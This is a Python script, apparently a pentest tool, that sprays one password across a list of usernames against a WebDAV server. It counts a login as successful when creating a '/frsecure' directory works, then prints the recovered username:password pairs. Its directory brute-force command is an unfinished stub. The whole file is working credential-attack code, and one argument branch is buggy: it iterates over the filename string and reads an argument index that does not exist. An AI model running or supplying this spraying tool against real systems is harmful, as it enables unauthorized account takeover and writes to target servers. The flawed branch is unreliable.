#!/usr/bin/python3
from webdav3.client import Client
import sys
users = {}


def password_spray(user, password, wd_address):
    options = {'webdav_hostname': wd_address,
                'webdav_login': user,
                'webdav_password': password,
                'disable_check': True}
    wd_client = Client(options)
    try:
        wd_client.mkdir("/frsecure")
        users[user] = password
    except Exception as e:
        if "failed with code 403" in e.__str__():
            print("user {} failed".format(user))
        else:
            print("error: {}".format(e))

def dirbrute(wd_address):
    print("todo")


def main():
    usage = '''
USAGE:
python webdav_spray.py command wd_address users_file(optional), password_to_spray(optional)
Commands:
  spray = spray a password
  dirbrute = brute force directories in the webdav server    
    '''
    if len(sys.argv) == 3:
        command = sys.argv[1]
        wd_address = sys.argv[2]
        if command == 'spray':
            users_file = input("path to users file? $>")
            password = input("password to spray? $> ")
            with open(users_file, 'r') as f:
                for line in f:
                    password_spray(line, password , wd_address)
        elif command == 'dirbrute': 
            dirbrute(wd_address)
    elif len(sys.argv) == 4:
        command = sys.argv[1]
        wd_address = sys.argv[2]
        users_file = sys.argv[3]
        password = input("password to spray? $> ")
        if command == 'spray':
            with open(users_file, 'r') as f:
                for line in users_file:
                    password_spray(line, sys.argv[4], wd_address)
        elif command == 'dirbrute':
            dirbrute(wd_address)
        else:
            print("UNKNOWN COMMAND")
            print(usage)

    elif len(sys.argv) == 5:
        command = sys.argv[1]
        wd_address = sys.argv[2]
        users_file = sys.argv[3]
        if command == 'spray':
            with open(users_file, 'r') as f:
                for line in f:
                    password_spray(line, sys.argv[4], wd_address)
        elif command == 'dirbrute':
            dirbrute(wd_address)
        else:
            print('Unknown Command!')
            print(usage)
    else:
        print(usage)
    if len(users) != 0:
        for user in users.keys():
            print("Password found!  {}:{}".format(user, users[user]))



if __name__ == "__main__":
    main()
